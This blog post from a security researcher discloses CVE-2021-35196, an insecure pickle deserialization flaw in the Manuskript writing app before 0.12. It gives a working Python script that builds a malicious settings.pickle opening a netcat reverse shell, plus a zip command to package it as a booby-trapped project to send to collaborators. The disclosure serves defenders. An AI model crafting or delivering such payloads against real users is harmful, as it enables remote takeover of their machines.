
# [Pizza-Powered Hacking üçï](https://www.pizzapower.me/)

##

 Menu [Skip to content](#content)

* [Home](https://www.pizzapower.me/)
* [whoami](https://pizzapower.me/whoami)
# Arbitrary Code Execution in Manuskript < 0.12

Edit: A [pull request](https://github.com/olivierkes/manuskript/pull/895) has been submitted to remove this functionality and to depricate the old pickled settings, which is a wise security decision.

Edit: This vulnerability has been assigned CVE-2021-35196. It‚Äôs currently listed as disputed, even though it is definitely a vulnerability.

I was searching for an alternative to Scrivener to write my future nobel prize winning novel and ran across [Manuskript](https://www.theologeek.ch/manuskript/). It looked promising. I found out that it was open-source and on [github](https://github.com/olivierkes/manuskript) ‚Äì which is always cool.

I decided to clone it and take a look at it. It‚Äôs written in Python, so that is good for me. It‚Äôs probably the language I‚Äôm most comfortable in these days.

I started checking out the code and I immediately noticed that pickle was imported in settings.py. The first thing that should come to mind to any security researcher worth their salt is insecure deserialization via the `pickle.loads()` and `pickle.load()` functions.

Sure enough, in settings.py, I noticed on lines 190 and 191, it looks like the program‚Äôs settings are loaded via `pickle.loads()` and `pickle.load()`, respectively. Now, I just had to figure out how to get to that point in the code.

It turns out that this wasn‚Äôt overly tough and it would simply involve loading a project that contains a malicious `settings.pickle` file. In `loadSave.py`, the function loadProject() on line 30 is responsible for doing exactly what you think it is supposed to do. You will notice in this function that it checks to see if the project is a zip file, but the project does not have to be a zip file.

I used a zip file in my exploit because that would probably be what is used in a realistic exploitation scenario. e.g. I send a malicious project to a co-writer, editor, publisher, etc. or I post a sample project of some sort online for others to use.

After the function determines if the project is a zip file or not, it checks the version of the project. This is where you need to do a small amount of work to exploit the insecure deserialization. It turns out that Manuskript has two versions of settings, version 0 and version 1. Version 0 is the one that uses the pickle module to deserialize the settings.

In order to force the program into the insecure deserialization, we just have to have a zip file without a `MANUSKRIPT` text file or a `VERSION` text file in the project and the project number will default to 0, which is what we want.

Now, onto the exploit. There are many references to insecure deserialization online, so google them if you aren‚Äôt familiar, but here is the code I used on Ubuntu 20.04 to generate a reverse shell to localhost port 1234. This payload can easily be modified to do anything you want it to do on Linux, Mac, and/or Windows. When this code is ran, it outputs a malicious settings.pickle file, which we will include in the project.

```
#!/usr/bin/env python3

import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
       	cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

pickle_data = pickle.dumps(EvilPickle())
with open("settings.pickle", "wb") as file:
    file.write(pickle_data)
```

After the settings.pickle file is output, simply zip it up:

```
zip malicious-project.zip settings.pickle
```

And now you have a malicious-project.zip file that you simply load into Manuskript.

I notified the people involved and they don‚Äôt have intentions to fix this issue. They are currently refactoring the project and the deserialization code may be removed altogether.

 This entry was posted in [blog](https://www.pizzapower.me/category/blog/), [coding](https://www.pizzapower.me/category/coding/), [CVE](https://www.pizzapower.me/category/cve/), [cybersecurity](https://www.pizzapower.me/category/cybersecurity/), [hacking](https://www.pizzapower.me/category/hacking/) on [June 20, 2021](https://www.pizzapower.me/2021/06/20/arbitrary-code-execution-in-manuskript-0-12/ "5:49 pm") by [pizzapower](https://www.pizzapower.me/author/pizzapower/ "View all posts by pizzapower").
### Post navigation

[‚Üê Offensive Security AWAE/OSWE](https://www.pizzapower.me/2021/03/25/offensive-security-awae-oswe/) [Malicious qBittorrent Search Plugin: Feature or Bug? ‚Üí](https://www.pizzapower.me/2021/06/20/malicious-qbittorrent-search-plugin/) Search for:
### Recent Posts

* [Mura/Masa CMS ‚Äì SQL Injection CVE-2024-32640](https://www.pizzapower.me/2024/11/13/mura-masa-cms-sql-injection-cve-2024-32640/)
* [iOS 16.7.8 Jailbreak on iPhone X](https://www.pizzapower.me/2024/07/25/ios-16-7-8-jailbreak-on-iphone-x/)
* [Bug Bounty VPS Box Part 2](https://www.pizzapower.me/2023/12/30/bug-bounty-vps-box-part-2/)
* [Hacking RAMADDA, White Box Web Apps, and Bug Bounty Tips](https://www.pizzapower.me/2023/10/20/hacking-ramadda-white-box-web-apps-and-bug-bounty-tips/)
* [Department of Defense Researcher of the Month](https://www.pizzapower.me/2023/08/18/department-of-defense-researcher-of-the-month-and-more/)
### Archives

* [November 2024](https://www.pizzapower.me/2024/11/)
* [July 2024](https://www.pizzapower.me/2024/07/)
* [December 2023](https://www.pizzapower.me/2023/12/)
* [October 2023](https://www.pizzapower.me/2023/10/)
* [August 2023](https://www.pizzapower.me/2023/08/)
* [March 2023](https://www.pizzapower.me/2023/03/)
* [February 2023](https://www.pizzapower.me/2023/02/)
* [January 2023](https://www.pizzapower.me/2023/01/)
* [November 2022](https://www.pizzapower.me/2022/11/)
* [October 2022](https://www.pizzapower.me/2022/10/)
* [September 2022](https://www.pizzapower.me/2022/09/)
* [August 2022](https://www.pizzapower.me/2022/08/)
* [June 2022](https://www.pizzapower.me/2022/06/)
* [April 2022](https://www.pizzapower.me/2022/04/)
* [February 2022](https://www.pizzapower.me/2022/02/)
* [January 2022](https://www.pizzapower.me/2022/01/)
* [December 2021](https://www.pizzapower.me/2021/12/)
* [November 2021](https://www.pizzapower.me/2021/11/)
* [October 2021](https://www.pizzapower.me/2021/10/)
* [September 2021](https://www.pizzapower.me/2021/09/)
* [August 2021](https://www.pizzapower.me/2021/08/)
* [July 2021](https://www.pizzapower.me/2021/07/)
* [June 2021](https://www.pizzapower.me/2021/06/)
* [March 2021](https://www.pizzapower.me/2021/03/)
* [January 2021](https://www.pizzapower.me/2021/01/)
* [December 2020](https://www.pizzapower.me/2020/12/)
* [November 2020](https://www.pizzapower.me/2020/11/)
* [October 2020](https://www.pizzapower.me/2020/10/)
### Categories

* [appsec](https://www.pizzapower.me/category/appsec/)
* [aws](https://www.pizzapower.me/category/aws/)
* [blog](https://www.pizzapower.me/category/blog/)
* [bug bounty](https://www.pizzapower.me/category/bug-bounty/)
* [bugbounty](https://www.pizzapower.me/category/bugbounty/)
* [certifications](https://www.pizzapower.me/category/certifications/)
* [cloud](https://www.pizzapower.me/category/cloud/)
* [coding](https://www.pizzapower.me/category/coding/)
* [coding, webdev](https://www.pizzapower.me/category/coding-webdev/)
* [cryptography](https://www.pizzapower.me/category/cryptography/)
* [CVE](https://www.pizzapower.me/category/cve/)
* [cybersecurity](https://www.pizzapower.me/category/cybersecurity/)
* [devops](https://www.pizzapower.me/category/devops/)
* [docker](https://www.pizzapower.me/category/docker/)
* [golang](https://www.pizzapower.me/category/golang/)
* [hacking](https://www.pizzapower.me/category/hacking/)
* [infosec](https://www.pizzapower.me/category/infosec/)
* [iot](https://www.pizzapower.me/category/iot/)
* [jailbreak](https://www.pizzapower.me/category/jailbreak/)
* [linode](https://www.pizzapower.me/category/linode/)
* [linux](https://www.pizzapower.me/category/linux/)
* [mobile](https://www.pizzapower.me/category/mobile/)
* [offensive security](https://www.pizzapower.me/category/offensive-security/)
* [offsec](https://www.pizzapower.me/category/offsec/)
* [POC](https://www.pizzapower.me/category/poc/)
* [powerwall](https://www.pizzapower.me/category/powerwall/)
* [python](https://www.pizzapower.me/category/python/)
* [security](https://www.pizzapower.me/category/security/)
* [self hosting](https://www.pizzapower.me/category/self-hosting/)
* [site news](https://www.pizzapower.me/category/site-news/)
* [solar](https://www.pizzapower.me/category/solar/)
* [tesla](https://www.pizzapower.me/category/tesla/)
* [torrents](https://www.pizzapower.me/category/torrents/)
* [Uncategorized](https://www.pizzapower.me/category/uncategorized/)
* [vps](https://www.pizzapower.me/category/vps/)
* [webdev](https://www.pizzapower.me/category/webdev/)
* [white box](https://www.pizzapower.me/category/white-box/)
  [Proudly powered by WordPress](https://wordpress.org/ "Semantic Personal Publishing Platform")